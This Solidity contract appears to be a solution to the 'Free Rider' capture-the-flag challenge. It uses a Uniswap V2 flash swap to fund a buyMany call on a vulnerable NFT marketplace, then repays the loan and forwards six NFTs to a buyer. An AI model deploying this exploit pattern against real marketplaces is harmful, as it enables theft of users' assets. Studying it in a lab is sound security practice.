// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "../WETH9.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/interfaces/IERC721.sol";

interface UniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, ERC721Holder {
    WETH9 immutable weth;
    IERC721 immutable nft;
    FreeRiderNFTMarketplace immutable marketplace;
    UniswapV2Pair immutable pair;
    address immutable buyer;
    uint256[] private ids = [0, 1, 2, 3, 4, 5];

    constructor(
        address _buyer,
        address _weth,
        address _nft,
        address _marketplace,
        address _pair
    ) {
        buyer = _buyer;
        weth = WETH9(payable(_weth));
        nft = IERC721(_nft);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        pair = UniswapV2Pair(_pair);
    }

    function flashSwap(uint256 amount0Out, uint256 amount1Out) external {
        pair.swap(amount0Out, amount1Out, address(this), new bytes(1));
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external override {
        weth.withdraw(amount0);
        marketplace.buyMany{value: address(this).balance}(ids);
        uint256 returnAmount = (amount0 / 9960) * 10000;

        weth.deposit{value: returnAmount}();
        weth.transfer(address(pair), weth.balanceOf(address(this)));
        for (uint8 i = 0; i < ids.length; i++) {
            nft.safeTransferFrom(address(this), buyer, ids[i]);
        }
    }

    receive() external payable {}
}
